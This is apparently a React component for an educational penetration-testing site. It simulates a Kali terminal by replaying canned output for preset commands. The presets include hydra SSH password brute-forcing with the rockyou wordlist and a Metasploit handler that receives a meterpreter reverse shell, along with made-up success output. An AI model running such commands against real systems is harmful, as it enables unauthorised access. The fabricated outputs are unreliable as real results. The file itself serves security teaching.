import { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Terminal as TerminalIcon } from "lucide-react";

const DEMO_COMMANDS: Array<{ cmd: string; output: string[] }> = [
  {
    cmd: "nmap -sV -T4 192.168.1.1",
    output: [
      "Starting Nmap 7.94 ( https://nmap.org )",
      "Nmap scan report for 192.168.1.1",
      "Host is up (0.0011s latency).",
      "",
      "PORT     STATE SERVICE    VERSION",
      "22/tcp   open  ssh        OpenSSH 8.4",
      "80/tcp   open  http       nginx 1.18.0",
      "443/tcp  open  ssl/https  nginx 1.18.0",
      "8080/tcp open  http-proxy Squid 4.13",
      "",
      "Nmap done: 1 IP address (1 host up) scanned in 3.42 seconds",
    ],
  },
  {
    cmd: "whois target.com | grep -E 'Registrar|Creation'",
    output: [
      "Registrar: GoDaddy.com, LLC",
      "Registrar IANA ID: 146",
      "Creation Date: 2004-03-15T12:00:00Z",
      "Updated Date: 2023-11-01T08:22:14Z",
    ],
  },
  {
    cmd: "subfinder -d target.com -silent",
    output: [
      "dev.target.com",
      "staging.target.com",
      "api.target.com",
      "mail.target.com",
      "vpn.target.com",
      "[INF] Found 5 subdomains for target.com",
    ],
  },
  {
    cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10",
    output: [
      "Hydra v9.4 (c) 2022 by van Hauser/THC",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks",
      "[DATA] attacking ssh://192.168.1.10:22/",
      "[STATUS] 1024.00 tries/min, 1024 tries in 00:01h",
      "[22][ssh] host: 192.168.1.10   login: admin   password: password123",
      "1 of 1 target successfully completed",
    ],
  },
  {
    cmd: "msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.5; run'",
    output: [
      "[*] Using configured payload generic/shell_reverse_tcp",
      "[*] Started reverse TCP handler on 192.168.1.5:4444",
      "[*] Sending stage (3045348 bytes) to 192.168.1.20",
      "[*] Meterpreter session 1 opened (192.168.1.5:4444 -> 192.168.1.20:43122)",
      "",
      "meterpreter > getuid",
      "Server username: www-data",
      "meterpreter > sysinfo",
      "Computer     : target-server",
      "OS           : Ubuntu 20.04 (Linux 5.4.0)",
    ],
  },
];

interface TerminalLine {
  type: "prompt" | "output" | "blank";
  text: string;
}

export default function TerminalView() {
  const [lines, setLines] = useState<TerminalLine[]>([
    { type: "output", text: "KALI_ACADEMY TERMINAL PLAYGROUND v1.0" },
    { type: "output", text: "Simulated environment — for educational purposes only." },
    { type: "blank", text: "" },
  ]);
  const [currentCmdIdx, setCurrentCmdIdx] = useState(0);
  const [isRunning, setIsRunning] = useState(false);
  const [inputValue, setInputValue] = useState("");
  const [cursor, setCursor] = useState(true);
  const bottomRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const interval = setInterval(() => setCursor((c) => !c), 530);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [lines]);

  const runCommand = (cmd: string) => {
    if (isRunning) return;

    const demo = DEMO_COMMANDS.find((d) => d.cmd.startsWith(cmd.split(" ")[0]));
    const outputLines: string[] = demo
      ? demo.output
      : [`bash: ${cmd}: command simulated — run in a real Kali instance`, ""];

    setIsRunning(true);
    setLines((prev) => [...prev, { type: "prompt", text: cmd }]);

    let i = 0;
    const interval = setInterval(() => {
      if (i < outputLines.length) {
        const line = outputLines[i];
        setLines((prev) => [
          ...prev,
          line === "" ? { type: "blank", text: "" } : { type: "output", text: line },
        ]);
        i++;
      } else {
        setIsRunning(false);
        clearInterval(interval);
      }
    }, 80);
  };

  const loadPreset = () => {
    if (isRunning) return;
    const preset = DEMO_COMMANDS[currentCmdIdx % DEMO_COMMANDS.length];
    runCommand(preset.cmd);
    setCurrentCmdIdx((i) => i + 1);
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter" && inputValue.trim()) {
      runCommand(inputValue.trim());
      setInputValue("");
    }
  };

  return (
    <div className="space-y-6 pb-12">
      <header>
        <h1 className="text-3xl font-bold text-primary mb-2 flex items-center gap-3">
          <TerminalIcon className="w-8 h-8" />
          TERMINAL_
        </h1>
        <p className="text-muted-foreground text-sm border-l-2 border-primary pl-4 py-1">
          Simulated shell. Type commands or load presets to see example outputs.
        </p>
      </header>

      <div className="bg-black border border-primary/30 p-0 overflow-hidden">
        <div className="flex items-center gap-2 px-4 py-2 bg-primary/10 border-b border-primary/30">
          <div className="w-3 h-3 rounded-full bg-red-500/60" />
          <div className="w-3 h-3 rounded-full bg-yellow-500/60" />
          <div className="w-3 h-3 rounded-full bg-green-500/60" />
          <span className="text-xs text-muted-foreground ml-2 font-mono">root@kali:~</span>
        </div>

        <div className="h-96 overflow-y-auto p-4 font-mono text-sm" data-testid="terminal-output">
          {lines.map((line, i) => (
            <div key={i} className={line.type === "blank" ? "h-3" : "leading-relaxed"}>
              {line.type === "prompt" ? (
                <span>
                  <span className="text-green-400">root@kali:~# </span>
                  <span className="text-white">{line.text}</span>
                </span>
              ) : (
                <span className="text-green-300/80">{line.text}</span>
              )}
            </div>
          ))}
          <div ref={bottomRef} />
          {!isRunning && (
            <div className="flex items-center mt-1">
              <span className="text-green-400">root@kali:~# </span>
              <input
                data-testid="input-terminal"
                type="text"
                value={inputValue}
                onChange={(e) => setInputValue(e.target.value)}
                onKeyDown={handleKeyDown}
                className="bg-transparent text-white border-none outline-none flex-1 ml-2 font-mono text-sm"
                autoFocus
                spellCheck={false}
              />
              <span className={`w-2 h-4 bg-green-400 ml-0.5 ${cursor ? "opacity-100" : "opacity-0"} transition-opacity`} />
            </div>
          )}
          {isRunning && (
            <div className="flex items-center mt-1 text-green-400">
              <span className="animate-pulse">executing...</span>
            </div>
          )}
        </div>
      </div>

      <div className="flex flex-wrap gap-3">
        <button
          data-testid="button-run-preset"
          onClick={loadPreset}
          disabled={isRunning}
          className="border border-primary text-primary px-4 py-2 text-sm font-bold hover:bg-primary hover:text-primary-foreground transition-colors disabled:opacity-40"
        >
          RUN_NEXT_DEMO
        </button>
        <button
          data-testid="button-clear-terminal"
          onClick={() => setLines([{ type: "output", text: "Terminal cleared." }, { type: "blank", text: "" }])}
          className="border border-border text-muted-foreground px-4 py-2 text-sm hover:border-primary hover:text-primary transition-colors"
        >
          CLEAR
        </button>
      </div>

      <div className="bg-card border border-border p-5">
        <h3 className="text-sm font-bold text-primary mb-3">AVAILABLE DEMO COMMANDS</h3>
        <div className="space-y-2">
          {DEMO_COMMANDS.map((d, i) => (
            <div key={i} className="text-xs font-mono text-muted-foreground">
              <span className="text-green-400 mr-2">&gt;</span>
              {d.cmd.split(" ")[0]}
            </div>
          ))}
        </div>
        <p className="text-xs text-muted-foreground mt-4 border-t border-border pt-3">
          This is a simulated environment. All outputs are educational examples.
          Practice real commands in a dedicated Kali Linux VM or lab environment.
        </p>
      </div>
    </div>
  );
}
